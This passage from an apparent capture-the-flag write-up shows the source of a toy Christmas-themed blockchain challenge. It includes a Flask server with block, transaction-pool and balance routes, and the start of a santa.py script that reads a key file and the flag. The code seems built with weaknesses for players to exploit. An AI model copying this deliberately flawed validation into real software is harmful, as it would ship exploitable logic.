        <span class="n">current_hash</span> <span class="o">=</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">chain</span><span class="p">.</span><span class="nf">reverse</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">blk</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">:</span>
        <span class="n">nice_person</span> <span class="o">=</span> <span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">nice_person</span><span class="p">:</span>
            <span class="n">balances</span><span class="p">[</span><span class="n">nice_person</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">nice_person</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>

        <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
            <span class="n">tx_type</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">src</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">dst</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">tx_type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">src</span> <span class="o">==</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">:</span>
                <span class="n">balances</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="n">balances</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
            <span class="k">elif</span> <span class="n">tx_type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">:</span>
                <span class="n">amount</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">balances</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="n">amount</span>
                <span class="n">balances</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="n">balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">amount</span>

    <span class="k">return</span> <span class="n">balances</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">block_endpoint</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Get a block (default: best-chain head) or submit a mined block.</span><span class="sh">"""</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">blk_hash</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">)</span> <span class="ow">or</span> <span class="nf">get_best_chain_block</span><span class="p">()</span>
        <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">blk_hash</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">blk</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">unknown block id</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">blk_hash</span><span class="p">,</span> <span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">:</span> <span class="n">blk</span><span class="p">})</span>

    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">required_block_fields</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">required_block_fields</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">field</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">block</span><span class="p">:</span>
                <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">missing field </span><span class="si">{</span><span class="n">field</span><span class="si">}</span><span class="s"> in block</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="n">block_hash</span> <span class="o">=</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="n">prev_hash</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">)</span>

        <span class="n">prefix_bits</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">block_hash</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">block_hash</span><span class="p">.</span><span class="nf">lstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">))</span> <span class="o">*</span> <span class="mi">4</span>
        <span class="k">if</span> <span class="n">prefix_bits</span> <span class="o">&lt;</span> <span class="n">DIFFICULTY</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">invalid proof of work</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="k">if</span> <span class="n">prev_hash</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">unknown parent</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="n">expected_index</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">[</span><span class="n">prev_hash</span><span class="p">][</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">block</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected_index</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">invalid index</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="n">nice_person</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
                <span class="nf">validate_tx</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">)</span> <span class="o">==</span> <span class="n">nice_person</span><span class="p">:</span>
                    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">nice person cannot be tx src</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
        <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s"> in block tx</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="n">balances</span> <span class="o">=</span> <span class="nf">get_nice_balances</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="k">if</span> <span class="nf">any</span><span class="p">(</span><span class="n">balance</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">balance</span> <span class="ow">in</span> <span class="n">balances</span><span class="p">.</span><span class="nf">values</span><span class="p">()):</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">negative balance</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

        <span class="n">mined_nonces</span> <span class="o">=</span> <span class="p">[</span><span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]</span> <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]]</span>
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">mined_nonces</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="nf">set</span><span class="p">(</span><span class="n">mined_nonces</span><span class="p">)):</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">duplicate tx nonce in block</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
        <span class="k">while</span> <span class="n">prev_hash</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">:</span>
            <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">[</span><span class="n">prev_hash</span><span class="p">]</span>
            <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
                <span class="k">if</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">)</span> <span class="ow">in</span> <span class="n">mined_nonces</span><span class="p">:</span>
                    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">duplicate tx nonce in chain</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
            <span class="n">prev_hash</span> <span class="o">=</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>

        <span class="c1"># Enforce a cap: no identity may appear as "nice" more than 10 times in the chain.
</span>        <span class="n">nice_counts</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="n">current_hash</span> <span class="o">=</span> <span class="n">block_hash</span>
        <span class="n">blk</span> <span class="o">=</span> <span class="n">block</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">nice_person</span> <span class="o">=</span> <span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">nice_person</span><span class="p">:</span>
                <span class="n">nice_counts</span><span class="p">[</span><span class="n">nice_person</span><span class="p">]</span> <span class="o">=</span> <span class="n">nice_counts</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">nice_person</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="k">if</span> <span class="n">nice_counts</span><span class="p">[</span><span class="n">nice_person</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
                    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abuse of nice list detected</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
            <span class="n">current_hash</span> <span class="o">=</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">current_hash</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">[</span><span class="n">current_hash</span><span class="p">]</span>

        <span class="n">BLOCKS</span><span class="p">[</span><span class="n">block_hash</span><span class="p">]</span> <span class="o">=</span> <span class="n">block</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">accepted</span><span class="sh">"</span><span class="p">})</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/tx</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">submit_tx</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Submit a transaction into the global tx pool.</span><span class="sh">"""</span>
    <span class="n">tx</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">validate_tx</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">400</span>

    <span class="n">TXPOOL</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">(),</span> <span class="n">tx</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">queued</span><span class="sh">"</span><span class="p">})</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/txpool</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_txpool</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Get the relevant tx pool (default: best-chain head).</span><span class="sh">"""</span>
    <span class="n">blk_hash</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">)</span> <span class="ow">or</span> <span class="nf">get_best_chain_block</span><span class="p">()</span>

    <span class="n">mined_nonces</span> <span class="o">=</span> <span class="nf">set</span><span class="p">()</span>
    <span class="n">current_hash</span> <span class="o">=</span> <span class="n">blk_hash</span>
    <span class="k">while</span> <span class="n">current_hash</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">:</span>
        <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">[</span><span class="n">current_hash</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
            <span class="n">mined_nonces</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">))</span>
        <span class="n">current_hash</span> <span class="o">=</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>

    <span class="n">now</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
    <span class="n">TXPOOL</span><span class="p">[:]</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">(</span><span class="n">ts</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span> <span class="k">for</span> <span class="n">ts</span><span class="p">,</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">TXPOOL</span>
        <span class="k">if</span> <span class="n">now</span> <span class="o">-</span> <span class="n">ts</span> <span class="o">&lt;=</span> <span class="n">TX_EXPIRY_SECONDS</span>
    <span class="p">]</span>
    <span class="n">fresh</span> <span class="o">=</span> <span class="p">[</span><span class="n">tx</span> <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">TXPOOL</span> <span class="k">if</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mined_nonces</span><span class="p">]</span>

    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">blk_hash</span><span class="p">,</span> <span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">:</span> <span class="n">fresh</span><span class="p">})</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/balances</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_balances</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Get nice/transfer balances for the chain ending at the given (or best) hash.</span><span class="sh">"""</span>
    <span class="n">blk_hash</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">)</span> <span class="ow">or</span> <span class="nf">get_best_chain_block</span><span class="p">()</span>
    <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">blk_hash</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">blk</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">unknown block id</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>
    <span class="n">balances</span> <span class="o">=</span> <span class="nf">get_nice_balances</span><span class="p">(</span><span class="n">blk</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">blk_hash</span><span class="p">,</span> <span class="sh">"</span><span class="s">balances</span><span class="sh">"</span><span class="p">:</span> <span class="n">balances</span><span class="p">})</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>santa.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python -u
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>

<span class="n">NORTH_POOLE</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">NORTH_POOLE</span><span class="sh">"</span><span class="p">]</span>
<span class="n">SANTA_KEY</span> <span class="o">=</span> <span class="n">serialization</span><span class="p">.</span><span class="nf">load_ssh_private_key</span><span class="p">(</span>
    <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/keys/santa/key</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_bytes</span><span class="p">(),</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span>
<span class="p">)</span>

<span class="n">GIFTS</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">bicycle</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">train set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">drone</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">robot kit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">skateboard</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">telescope</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">lego castle</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">paint set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">guitar</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">soccer ball</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">puzzle box</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">chemistry kit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">story book</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">piano keyboard</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">rollerblades</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">coding tablet</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">chess set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">binoculars</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">science lab</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">magic set</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">remote car</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ukulele</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">basketball</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">hockey stick</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">football</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dollhouse</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">action figures</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">model airplane</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">rc helicopter</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">night sky map</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">art easel</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">scooter</span><span class="sh">"</span><span class="p">,</span>
<span class="p">]</span>
<span class="n">SECRET_GIFT</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>
<span class="n">FLAG_GIFT</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_text</span><span class="p">()</span>
<span class="n">LETTER_HEADER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Dear Santa,</span><span class="se">\n\n</span><span class="s">For christmas this year I would like </span><span class="sh">"</span>

<span class="n">REQUIRED_CONFIRMATION_DEPTH</span> <span class="o">=</span> <span class="mi">5</span>

<span class="n">RECENT_GIFTS_EXPIRY_SECONDS</span> <span class="o">=</span> <span class="mi">90</span>
<span class="n">RECENT_GIFTS</span> <span class="o">=</span> <span class="p">{}</span>


<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[santa] starting...</span><span class="sh">"</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[santa] looking for new letters...</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">now</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
        <span class="n">RECENT_GIFTS</span> <span class="o">=</span> <span class="p">{</span><span class="n">gift</span><span class="p">:</span> <span class="n">ts</span> <span class="k">for</span> <span class="n">gift</span><span class="p">,</span> <span class="n">ts</span> <span class="ow">in</span> <span class="n">RECENT_GIFTS</span><span class="p">.</span><span class="nf">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">now</span> <span class="o">-</span> <span class="n">ts</span> <span class="o">&lt;=</span> <span class="n">RECENT_GIFTS_EXPIRY_SECONDS</span><span class="p">}</span>

